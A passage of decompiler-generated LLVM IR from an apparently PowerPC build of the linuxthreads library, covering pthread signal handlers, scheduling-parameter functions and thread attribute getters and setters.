  %stack_var_-184 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 %tmp, i32* @r27, align 4
  %v3_10004360 = load i32, i32* @global_var_1002c258.128, align 4
  %v0_10004364 = load i32, i32* @r2, align 4
  store i32 %v0_10004364, i32* @r31, align 4
  %tmp13 = icmp sgt i32 %v3_10004360, -1
  br i1 %tmp13, label %dec_label_pc_10004380, label %dec_label_pc_10004370

dec_label_pc_10004370:                            ; preds = %entry
  store i32 268452724, i32* @lr, align 4
  %v1_10004370 = call i32 @__pthread_initialize_manager(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v1_10004374 = icmp slt i32 %v1_10004370, 0
  br i1 %v1_10004374, label %dec_label_pc_100043f4, label %dec_label_pc_10004370.dec_label_pc_10004380_crit_edge

dec_label_pc_10004370.dec_label_pc_10004380_crit_edge: ; preds = %dec_label_pc_10004370
  %v0_100043a0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004380

dec_label_pc_10004380:                            ; preds = %dec_label_pc_10004370.dec_label_pc_10004380_crit_edge, %entry
  %v0_100043a0 = phi i32 [ %v0_100043a0.pre, %dec_label_pc_10004370.dec_label_pc_10004380_crit_edge ], [ %v0_10004364, %entry ]
  %v2_1000438c = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v0_100043a0, i32* %stack_var_-184, align 4
  store i32 268452776, i32* @lr, align 4
  %v3_100043a4 = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_1000438c)
  %v2_100043ac = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_100043a8

dec_label_pc_100043a8:                            ; preds = %dec_label_pc_100043c4, %dec_label_pc_10004380
  %v3_100043b0 = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268452796, i32* @lr, align 4
  %v2_100043b8 = call i32 @__libc_write(i32 %v3_100043b0, i32 %v2_100043ac)
  %v3_100043bc = icmp eq i32 %v2_100043b8, -1
  br i1 %v3_100043bc, label %dec_label_pc_100043c4, label %dec_label_pc_100043d4

dec_label_pc_100043c4:                            ; preds = %dec_label_pc_100043a8
  %v0_100043c4 = call i32 @__errno_location()
  %v1_100043c8 = inttoptr i32 %v0_100043c4 to i32*
  %v2_100043c8 = load i32, i32* %v1_100043c8, align 4
  %v3_100043cc = icmp eq i32 %v2_100043c8, 4
  br i1 %v3_100043cc, label %dec_label_pc_100043a8, label %dec_label_pc_100043d4

dec_label_pc_100043d4:                            ; preds = %dec_label_pc_100043a8, %dec_label_pc_100043c4
  %v0_100043d4 = load i32, i32* @r31, align 4
  store i32 %v0_100043d4, i32* @r3, align 4
  store i32 268452828, i32* @lr, align 4
  %v1_100043d8 = call i32 @suspend(i32 %v0_100043d4)
  %v0_100043dc = load i32, i32* @r31, align 4
  %v1_100043dc = add i32 %v0_100043dc, 52
  %v2_100043dc = inttoptr i32 %v1_100043dc to i32*
  %v3_100043dc = load i32, i32* %v2_100043dc, align 4
  %v3_100043e0 = icmp eq i32 %v3_100043dc, 0
  br i1 %v3_100043e0, label %dec_label_pc_100043e8, label %dec_label_pc_100043f0

dec_label_pc_100043e8:                            ; preds = %dec_label_pc_100043d4
  %v1_100043e8 = add i32 %v0_100043dc, 48
  %v2_100043e8 = inttoptr i32 %v1_100043e8 to i32*
  %v3_100043e8 = load i32, i32* %v2_100043e8, align 4
  %v1_100043ec = load i32, i32* @r27, align 4
  %v2_100043ec = inttoptr i32 %v1_100043ec to i32*
  store i32 %v3_100043e8, i32* %v2_100043ec, align 4
  %v0_100043f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100043f0

dec_label_pc_100043f0:                            ; preds = %dec_label_pc_100043d4, %dec_label_pc_100043e8
  %v0_100043f0 = phi i32 [ %v0_100043dc, %dec_label_pc_100043d4 ], [ %v0_100043f0.pre, %dec_label_pc_100043e8 ]
  %v1_100043f0 = add i32 %v0_100043f0, 52
  %v2_100043f0 = inttoptr i32 %v1_100043f0 to i32*
  %v3_100043f0 = load i32, i32* %v2_100043f0, align 4
  br label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_10004370, %dec_label_pc_100043f0
  %v0_10004404 = phi i32 [ 11, %dec_label_pc_10004370 ], [ %v3_100043f0, %dec_label_pc_100043f0 ]
  ret i32 %v0_10004404

; uselistorder directives
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 (i32)* @suspend, { 1, 0 }
  uselistorder label %dec_label_pc_100043f4, { 1, 0 }
  uselistorder label %dec_label_pc_100043f0, { 1, 0 }
  uselistorder label %dec_label_pc_100043d4, { 1, 0 }
}

define i32 @pthread_handle_sigcancel() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10027c60.156 to i32), i32* %r9.global-to-local, align 4
  %v4_10004414 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10004414, i32* %stack_var_-16, align 4
  %v5_10004414 = ptrtoint i32* %stack_var_-16 to i32
  %v0_10004418 = load i32, i32* @r2, align 4
  %v4_10004418 = icmp eq i32 %v0_10004418, ptrtoint (i32* @global_var_10027c60.156 to i32)
  store i32 %v0_10004418, i32* %r11.global-to-local, align 4
  br i1 %v4_10004418, label %dec_label_pc_10004428, label %dec_label_pc_10004494

dec_label_pc_10004428:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10004430 = load i32, i32* @global_var_1002c32c.131, align 4
  %v2_10004434 = icmp ult i32 %v5_10004414, %v3_10004430
  br i1 %v2_10004434, label %dec_label_pc_1000445c, label %dec_label_pc_1000443c

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_10004428
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10004440 = load i32, i32* @global_var_1002c330.132, align 4
  %v2_10004444 = icmp ult i32 %v5_10004414, %v3_10004440
  br i1 %v2_10004444, label %dec_label_pc_10004474, label %dec_label_pc_1000445c

dec_label_pc_10004458:                            ; preds = %dec_label_pc_10004468, %dec_label_pc_1000445c
  %v1_10004458 = add i32 %v0_10004458, 16
  br label %dec_label_pc_1000445c

dec_label_pc_1000445c:                            ; preds = %dec_label_pc_10004428, %dec_label_pc_1000443c, %dec_label_pc_10004458
  %v0_10004458 = phi i32 [ %v1_10004458, %dec_label_pc_10004458 ], [ ptrtoint (i32* @global_var_10027f20.166 to i32), %dec_label_pc_1000443c ], [ ptrtoint (i32* @global_var_10027f20.166 to i32), %dec_label_pc_10004428 ]
  store i32 %v0_10004458, i32* %r9.global-to-local, align 4
  %v1_1000445c = add i32 %v0_10004458, 8
  %v2_1000445c = inttoptr i32 %v1_1000445c to i32*
  %v3_1000445c = load i32, i32* %v2_1000445c, align 4
  store i32 %v3_1000445c, i32* %r11.global-to-local, align 4
  %v3_10004460 = icmp ugt i32 %v5_10004414, %v3_1000445c
  br i1 %v3_10004460, label %dec_label_pc_10004458, label %dec_label_pc_10004468

dec_label_pc_10004468:                            ; preds = %dec_label_pc_1000445c
  %v1_10004468 = add i32 %v0_10004458, 12
  %v2_10004468 = inttoptr i32 %v1_10004468 to i32*
  %v3_10004468 = load i32, i32* %v2_10004468, align 4
  %v2_1000446c = icmp ult i32 %v5_10004414, %v3_10004468
  br i1 %v2_1000446c, label %dec_label_pc_10004458, label %dec_label_pc_10004474.loopexit

dec_label_pc_10004474.loopexit:                   ; preds = %dec_label_pc_10004468
  br label %dec_label_pc_10004474

dec_label_pc_10004474:                            ; preds = %dec_label_pc_10004474.loopexit, %dec_label_pc_1000443c
  %v0_1000448c = phi i32 [ %v3_1000445c, %dec_label_pc_10004474.loopexit ], [ ptrtoint (i32* @global_var_10027c60.156 to i32), %dec_label_pc_1000443c ]
  store i32 ptrtoint (i32* @global_var_10027c60.156 to i32), i32* %r9.global-to-local, align 4
  %v4_1000447c = icmp eq i32 %v0_1000448c, ptrtoint (i32* @global_var_10027c60.156 to i32)
  br i1 %v4_1000447c, label %dec_label_pc_10004484, label %dec_label_pc_1000448c

dec_label_pc_10004484:                            ; preds = %dec_label_pc_10004474
  store i32 ptrtoint (i32* @global_var_10004488.167 to i32), i32* @lr, align 4
  %v1_10004484 = call i32 @__pthread_manager_sighandler(i32 ptrtoint (i32* @global_var_10027c60.156 to i32))
  store i32 %v1_10004484, i32* @r3, align 4
  br label %dec_label_pc_1000451c

dec_label_pc_1000448c:                            ; preds = %dec_label_pc_10004474
  store i32 %v0_1000448c, i32* @r2, align 4
  store i32 %v0_1000448c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004494

dec_label_pc_10004494:                            ; preds = %entry, %dec_label_pc_1000448c
  %v0_100044ac = phi i32 [ %v0_10004418, %entry ], [ %v0_1000448c, %dec_label_pc_1000448c ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10004498 = load i32, i32* @global_var_1002c334.168, align 4
  %v3_1000449c = icmp eq i32 %v3_10004498, 0
  br i1 %v3_1000449c, label %dec_label_pc_100044d4, label %dec_label_pc_100044a4

dec_label_pc_100044a4:                            ; preds = %dec_label_pc_10004494
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_100044a8 = load i32, i32* @global_var_1002c254, align 4
  %v4_100044ac = icmp eq i32 %v0_100044ac, %v3_100044a8
  br i1 %v4_100044ac, label %dec_label_pc_100044b4, label %dec_label_pc_100044c8

dec_label_pc_100044b4:                            ; preds = %dec_label_pc_100044a4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100044bc = load i32, i32* @global_var_10027c74.129, align 4
  store i32 268453064, i32* @lr, align 4
  %v3_100044c4 = call i32 @waitpid(i32 %v3_100044bc, i32 0, i32 -2147483648)
  br label %dec_label_pc_100044c8

dec_label_pc_100044c8:                            ; preds = %dec_label_pc_100044a4, %dec_label_pc_100044b4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_100044cc = load i32, i32* @global_var_1002c338.169, align 4
  %v1_100044d0 = call i32 @__GI__exit(i32 %v3_100044cc)
  store i32 %v1_100044d0, i32* @r3, align 4
  %v0_100044d4.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_100044d4

dec_label_pc_100044d4:                            ; preds = %dec_label_pc_10004494, %dec_label_pc_100044c8
  %v0_100044ec = phi i32 [ %v0_100044ac, %dec_label_pc_10004494 ], [ %v0_100044d4.pre, %dec_label_pc_100044c8 ]
  %v1_100044d4 = add i32 %v0_100044ec, 66
  %v2_100044d4 = inttoptr i32 %v1_100044d4 to i8*
  %v3_100044d4 = load i8, i8* %v2_100044d4, align 1
  %v3_100044d8 = icmp eq i8 %v3_100044d4, 0
  br i1 %v3_100044d8, label %dec_label_pc_1000451c, label %dec_label_pc_100044e0

dec_label_pc_100044e0:                            ; preds = %dec_label_pc_100044d4
  %v1_100044e0 = add i32 %v0_100044ec, 64
  %v2_100044e0 = inttoptr i32 %v1_100044e0 to i8*
  %v3_100044e0 = load i8, i8* %v2_100044e0, align 1
  %v4_100044e0 = zext i8 %v3_100044e0 to i32
  store i32 %v4_100044e0, i32* %r9.global-to-local, align 4
  %v3_100044e4 = icmp eq i8 %v3_100044e0, 0
  br i1 %v3_100044e4, label %dec_label_pc_100044ec, label %dec_label_pc_1000451c

dec_label_pc_100044ec:                            ; preds = %dec_label_pc_100044e0
  %v1_100044ec = add i32 %v0_100044ec, 65
  %v2_100044ec = inttoptr i32 %v1_100044ec to i8*
  %v3_100044ec = load i8, i8* %v2_100044ec, align 1
  %v3_100044f0 = icmp eq i8 %v3_100044ec, 1
  br i1 %v3_100044f0, label %dec_label_pc_100044f8, label %dec_label_pc_10004504

dec_label_pc_100044f8:                            ; preds = %dec_label_pc_100044ec
  %v0_10004500 = call i32 @__pthread_do_exit()
  %v0_10004504.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004504

dec_label_pc_10004504:                            ; preds = %dec_label_pc_100044ec, %dec_label_pc_100044f8
  %v1_10004510 = phi i32 [ %v0_100044ec, %dec_label_pc_100044ec ], [ %v0_10004504.pre, %dec_label_pc_100044f8 ]
  %v1_10004504 = add i32 %v1_10004510, 40
  %v2_10004504 = inttoptr i32 %v1_10004504 to i32*
  %v3_10004504 = load i32, i32* %v2_10004504, align 4
  store i32 %v3_10004504, i32* @r3, align 4
  %v3_10004508 = icmp eq i32 %v3_10004504, 0
  br i1 %v3_10004508, label %dec_label_pc_1000451c, label %dec_label_pc_10004510

dec_label_pc_10004510:                            ; preds = %dec_label_pc_10004504
  %v0_10004510 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_10004510, i32* %v2_10004504, align 4
  store i32 268453148, i32* @lr, align 4
  %v0_10004518 = load i32, i32* @r3, align 4
  %v2_10004518 = call i32 @siglongjmp(i32 %v0_10004518, i32 1)
  store i32 %v2_10004518, i32* @r3, align 4
  br label %dec_label_pc_1000451c

dec_label_pc_1000451c:                            ; preds = %dec_label_pc_100044e0, %dec_label_pc_10004504, %dec_label_pc_100044d4, %dec_label_pc_10004484, %dec_label_pc_10004510
  %v0_10004528 = load i32, i32* @r3, align 4
  ret i32 %v0_10004528

; uselistorder directives
  uselistorder i32 %v0_1000448c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10004458, { 1, 2, 3, 0 }
  uselistorder i32 %v5_10004414, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9 }
  uselistorder i32* %r11.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000451c, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10004504, { 1, 0 }
  uselistorder label %dec_label_pc_100044d4, { 1, 0 }
  uselistorder label %dec_label_pc_100044c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004494, { 1, 0 }
  uselistorder label %dec_label_pc_1000445c, { 2, 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10004538 = load i32, i32* @r2, align 4
  %v2_10004538 = add i32 %v1_10004538, 32
  %v3_10004538 = inttoptr i32 %v2_10004538 to i32*
  store i32 %arg1, i32* %v3_10004538, align 4
  %v0_1000453c = load i32, i32* @r2, align 4
  %v1_1000453c = add i32 %v0_1000453c, 36
  %v2_1000453c = inttoptr i32 %v1_1000453c to i32*
  %v3_1000453c = load i32, i32* %v2_1000453c, align 4
  %v3_10004540 = icmp eq i32 %v3_1000453c, 0
  br i1 %v3_10004540, label %entry.dec_label_pc_10004554_crit_edge, label %dec_label_pc_10004548

entry.dec_label_pc_10004554_crit_edge:            ; preds = %entry
  %v0_10004560.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004554

dec_label_pc_10004548:                            ; preds = %entry
  store i32 %v3_1000453c, i32* %r3.global-to-local, align 4
  store i32 268453204, i32* @lr, align 4
  %v2_10004550 = call i32 @siglongjmp(i32 %v3_1000453c, i32 1)
  store i32 %v2_10004550, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004554

dec_label_pc_10004554:                            ; preds = %entry.dec_label_pc_10004554_crit_edge, %dec_label_pc_10004548
  %v0_10004560 = phi i32 [ %v0_10004560.pre, %entry.dec_label_pc_10004554_crit_edge ], [ %v2_10004550, %dec_label_pc_10004548 ]
  ret i32 %v0_10004560

; uselistorder directives
  uselistorder i32 %v3_1000453c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder label %dec_label_pc_10004554, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000457c = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10004580 = add i32 %v1_1000457c, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %tmp, i32* %r28.global-to-local, align 4
  store i32 %v2_10004580, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268453276, i32* @lr, align 4
  %v0_10004598 = call i32 @__pthread_lock()
  store i32 %v0_10004598, i32* %r3.global-to-local, align 4
  %v0_1000459c = load i32, i32* @r31, align 4
  %v1_1000459c = add i32 %v0_1000459c, 8
  %v2_1000459c = inttoptr i32 %v1_1000459c to i32*
  %v3_1000459c = load i32, i32* %v2_1000459c, align 4
  store i32 %v0_1000459c, i32* @r3, align 4
  %v3_100045a4 = icmp eq i32 %v3_1000459c, 0
  br i1 %v3_100045a4, label %dec_label_pc_100045b8, label %dec_label_pc_100045ac

dec_label_pc_100045ac:                            ; preds = %entry
  %v1_100045ac = add i32 %v3_1000459c, 16
  %v2_100045ac = inttoptr i32 %v1_100045ac to i32*
  %v3_100045ac = load i32, i32* %v2_100045ac, align 4
  %v0_100045b0 = load i32, i32* @r29, align 4
  %v4_100045b0 = icmp eq i32 %v0_100045b0, %v3_100045ac
  br i1 %v4_100045b0, label %dec_label_pc_100045c4, label %dec_label_pc_100045b8

dec_label_pc_100045b8:                            ; preds = %dec_label_pc_100045ac, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_100045bc.171 to i32), i32* @lr, align 4
  %v0_100045b8 = call i32 @__pthread_unlock()
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000460c

dec_label_pc_100045c4:                            ; preds = %dec_label_pc_100045ac
  %v1_100045c4 = add i32 %v3_1000459c, 20
  %v2_100045c4 = inttoptr i32 %v1_100045c4 to i32*
  %v3_100045c4 = load i32, i32* %v2_100045c4, align 4
  store i32 %v3_100045c4, i32* %r29.global-to-local, align 4
  store i32 %v0_1000459c, i32* @r3, align 4
  store i32 268453328, i32* @lr, align 4
  %v0_100045cc = call i32 @__pthread_unlock()
  store i32 %v3_100045c4, i32* %r3.global-to-local, align 4
  store i32 268453336, i32* @lr, align 4
  %v1_100045d4 = call i32 @sched_getscheduler(i32 %v3_100045c4)
  %v0_100045d8 = load i32, i32* @r30, align 4
  store i32 %v1_100045d4, i32* @r31, align 4
  %v0_100045e0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100045e0, i32* %r3.global-to-local, align 4
  %v3_100045e4 = icmp eq i32 %v1_100045d4, -1
  br i1 %v3_100045e4, label %dec_label_pc_100045fc, label %dec_label_pc_100045ec

dec_label_pc_100045ec:                            ; preds = %dec_label_pc_100045c4
  store i32 268453360, i32* @lr, align 4
  %v2_100045ec = call i32 @sched_getparam(i32 %v0_100045e0, i32 %v0_100045d8)
  %v3_100045f0 = icmp eq i32 %v2_100045ec, -1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100045f0, label %dec_label_pc_100045fc, label %dec_label_pc_10004608

dec_label_pc_100045fc:                            ; preds = %dec_label_pc_100045ec, %dec_label_pc_100045c4
  %v0_100045fc = call i32 @__errno_location()
  store i32 %v0_100045fc, i32* %r3.global-to-local, align 4
  %v1_10004600 = inttoptr i32 %v0_100045fc to i32*
  %v2_10004600 = load i32, i32* %v1_10004600, align 4
  store i32 %v2_10004600, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000460c

dec_label_pc_10004608:                            ; preds = %dec_label_pc_100045ec
  %v0_10004608 = load i32, i32* @r31, align 4
  %v1_10004608 = load i32, i32* %r28.global-to-local, align 4
  %v2_10004608 = inttoptr i32 %v1_10004608 to i32*
  store i32 %v0_10004608, i32* %v2_10004608, align 4
  %v0_1000461c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000460c

dec_label_pc_1000460c:                            ; preds = %dec_label_pc_100045fc, %dec_label_pc_100045b8, %dec_label_pc_10004608
  %v0_1000461c = phi i32 [ %v2_10004600, %dec_label_pc_100045fc ], [ 3, %dec_label_pc_100045b8 ], [ %v0_1000461c.pre, %dec_label_pc_10004608 ]
  ret i32 %v0_1000461c

; uselistorder directives
  uselistorder i32 %v3_100045c4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000460c, { 2, 0, 1 }
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %v1_10004638 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_1000463c = add i32 %v1_10004638, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %v2_1000463c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 268453464, i32* @lr, align 4
  %v0_10004654 = call i32 @__pthread_lock()
  %v0_10004658 = load i32, i32* @r31, align 4
  %v1_10004658 = add i32 %v0_10004658, 8
  %v2_10004658 = inttoptr i32 %v1_10004658 to i32*
  %v3_10004658 = load i32, i32* %v2_10004658, align 4
  store i32 %v3_10004658, i32* %r30.global-to-local, align 4
  store i32 %v0_10004658, i32* @r3, align 4
  %v3_10004660 = icmp eq i32 %v3_10004658, 0
  br i1 %v3_10004660, label %dec_label_pc_1000467c, label %dec_label_pc_10004668

dec_label_pc_10004668:                            ; preds = %entry
  %v1_10004668 = add i32 %v3_10004658, 16
  %v2_10004668 = inttoptr i32 %v1_10004668 to i32*
  %v3_10004668 = load i32, i32* %v2_10004668, align 4
  %v0_10004674 = load i32, i32* @r29, align 4
  %v4_10004674 = icmp eq i32 %v0_10004674, %v3_10004668
  br i1 %v4_10004674, label %dec_label_pc_10004688, label %dec_label_pc_1000467c

dec_label_pc_1000467c:                            ; preds = %dec_label_pc_10004668, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10004680.172 to i32), i32* @lr, align 4
  %v0_1000467c = call i32 @__pthread_unlock()
  br label %dec_label_pc_100046e4

dec_label_pc_10004688:                            ; preds = %dec_label_pc_10004668
  store i32 268453520, i32* @lr, align 4
  %v0_1000468c = call i32 @sched_setscheduler()
  %v0_10004690 = load i32, i32* %r28.global-to-local, align 4
  %v3_10004694 = icmp eq i32 %v0_1000468c, -1
  %v0_1000469c = load i32, i32* @r31, align 4
  store i32 %v0_1000469c, i32* @r3, align 4
  br i1 %v3_10004694, label %dec_label_pc_100046a4, label %dec_label_pc_100046b4

dec_label_pc_100046a4:                            ; preds = %dec_label_pc_10004688
  store i32 268453544, i32* @lr, align 4
  %v0_100046a4 = call i32 @__pthread_unlock()
  %v0_100046a8 = call i32 @__errno_location()
  %v1_100046ac = inttoptr i32 %v0_100046a8 to i32*
  %v2_100046ac = load i32, i32* %v1_100046ac, align 4
  br label %dec_label_pc_100046e4

dec_label_pc_100046b4:                            ; preds = %dec_label_pc_10004688
  %v3_10004690 = icmp eq i32 %v0_10004690, 0
  br i1 %v3_10004690, label %dec_label_pc_100046bc, label %dec_label_pc_100046b8

dec_label_pc_100046b8:                            ; preds = %dec_label_pc_100046b4
  %v0_100046b8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100046b8 = inttoptr i32 %v0_100046b8 to i32*
  %v2_100046b8 = load i32, i32* %v1_100046b8, align 4
  br label %dec_label_pc_100046bc

dec_label_pc_100046bc:                            ; preds = %dec_label_pc_100046b4, %dec_label_pc_100046b8
  %v0_100046bc = phi i32 [ 0, %dec_label_pc_100046b4 ], [ %v2_100046b8, %dec_label_pc_100046b8 ]
  %v1_100046bc = load i32, i32* %r30.global-to-local, align 4
  %v2_100046bc = add i32 %v1_100046bc, 24
  %v3_100046bc = inttoptr i32 %v2_100046bc to i32*
  store i32 %v0_100046bc, i32* %v3_100046bc, align 4
  store i32 268453572, i32* @lr, align 4
  %v0_100046c0 = call i32 @__pthread_unlock()
  %v3_100046c8 = load i32, i32* @global_var_1002c258.128, align 4
  %v1_100046d0 = icmp slt i32 %v3_100046c8, 0
  br i1 %v1_100046d0, label %dec_label_pc_100046e4, label %dec_label_pc_100046d8

dec_label_pc_100046d8:                            ; preds = %dec_label_pc_100046bc
  %v0_100046d8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100046d8 = add i32 %v0_100046d8, 24
  %v2_100046d8 = inttoptr i32 %v1_100046d8 to i32*
  %v3_100046d8 = load i32, i32* %v2_100046d8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100046e0.173 to i32), i32* @lr, align 4
  %v1_100046dc = call i32 @__pthread_manager_adjust_prio(i32 %v3_100046d8)
  br label %dec_label_pc_100046e4

dec_label_pc_100046e4:                            ; preds = %dec_label_pc_100046bc, %dec_label_pc_100046a4, %dec_label_pc_1000467c, %dec_label_pc_100046d8
  %v0_100046f4 = phi i32 [ 0, %dec_label_pc_100046bc ], [ %v2_100046ac, %dec_label_pc_100046a4 ], [ 3, %dec_label_pc_1000467c ], [ 0, %dec_label_pc_100046d8 ]
  ret i32 %v0_100046f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100046e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100046bc, { 1, 0 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10004700 = icmp ugt i32 %arg2, 1
  br i1 %v2_10004700, label %dec_label_pc_10004714, label %dec_label_pc_1000470c

dec_label_pc_1000470c:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10004714

dec_label_pc_10004714:                            ; preds = %entry, %dec_label_pc_1000470c
  %v0_10004714 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_1000470c ]
  ret i32 %v0_10004714

; uselistorder directives
  uselistorder label %dec_label_pc_10004714, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000471c = load i32, i32* %arg1, align 4
  %v2_10004724 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000471c, i32* %v2_10004724, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000472c = icmp ugt i32 %arg2, 2
  br i1 %v2_1000472c, label %dec_label_pc_10004740, label %dec_label_pc_10004738

dec_label_pc_10004738:                            ; preds = %entry
  %v2_10004738 = add i32 %arg1, 4
  %v3_10004738 = inttoptr i32 %v2_10004738 to i32*
  store i32 %arg2, i32* %v3_10004738, align 4
  br label %dec_label_pc_10004740

dec_label_pc_10004740:                            ; preds = %entry, %dec_label_pc_10004738
  %v0_10004740 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10004738 ]
  ret i32 %v0_10004740

; uselistorder directives
  uselistorder label %dec_label_pc_10004740, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10004748 = add i32 %arg1, 4
  %v2_10004748 = inttoptr i32 %v1_10004748 to i32*
  %v3_10004748 = load i32, i32* %v2_10004748, align 4
  store i32 %v3_10004748, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10004758 = icmp ugt i32 %arg2, 1
  br i1 %v2_10004758, label %dec_label_pc_1000476c, label %dec_label_pc_10004764

dec_label_pc_10004764:                            ; preds = %entry
  %v2_10004764 = add i32 %arg1, 12
  %v3_10004764 = inttoptr i32 %v2_10004764 to i32*
  store i32 %arg2, i32* %v3_10004764, align 4
  br label %dec_label_pc_1000476c

dec_label_pc_1000476c:                            ; preds = %entry, %dec_label_pc_10004764
  %v0_1000476c = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10004764 ]
  ret i32 %v0_1000476c

; uselistorder directives
  uselistorder label %dec_label_pc_1000476c, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10004774 = add i32 %arg1, 12
  %v2_10004774 = inttoptr i32 %v1_10004774 to i32*
  %v3_10004774 = load i32, i32* %v2_10004774, align 4
  store i32 %v3_10004774, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10004784 = icmp eq i32 %arg2, 0
  %v1_10004788 = xor i32 %arg2, 1
  %tmp = icmp slt i32 %arg2, 0
  %v1_1000478c = zext i1 %tmp to i32
  %v2_1000478c = ashr i32 %arg2, 31
  %v3_1000478c = and i32 %v2_1000478c, -2
  %v4_1000478c = or i32 %v3_1000478c, %v1_1000478c
  %v2_10004790 = xor i32 %v1_10004788, %v4_1000478c
